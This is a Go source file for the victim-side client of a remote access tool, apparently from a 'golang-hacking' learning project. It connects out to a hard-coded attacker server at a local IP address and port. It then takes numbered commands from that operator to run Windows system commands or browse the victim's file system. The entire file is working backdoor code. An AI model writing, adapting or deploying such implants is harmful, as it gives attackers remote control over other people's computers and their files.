package main

import (
	"bufio"
	"fmt"
	"golang-hacking/VictimFinalVersion/core/ExecuteSystemCommandWindows"
	"golang-hacking/VictimFinalVersion/core/Move"
	"golang-hacking/VictimFinalVersion/core/handleConnection"
	"log"
	"strings"
)

type Data struct {
	Name string
	ID   int
	Age  float32
}

func DisplayError(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func main() {
	ServerIP := "192.168.10.191"
	Port := "9090"
	connection, err := handleConnection.ConnectionWithHacker(ServerIP, Port)
	if err != nil {
		log.Fatal(err)
	}

	defer connection.Close()
	fmt.Println("[+] Connection established with Server :", connection.RemoteAddr().String())

	reader := bufio.NewReader(connection)

	loopControl := true

	for loopControl {

		user_input_raw, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println(err)
			continue
		}

		user_input := strings.TrimSuffix(user_input_raw, "\n")

		switch {
		case user_input == "1":
			fmt.Println("[+] Executing Commands on windows")
			err := ExecuteSystemCommandWindows.ExecuteCommandWindows(connection)
			DisplayError(err)
		case user_input == "2":
			fmt.Println("[+] File system Navigation")
			err := Move.NavigateFilesystem(connection)
			DisplayError(err)
		case user_input == "99":
			fmt.Println("[-] Exiting the windows program")
			loopControl = false
		default:
			fmt.Println("[-] Invalid input, try again")
		}
	}
}
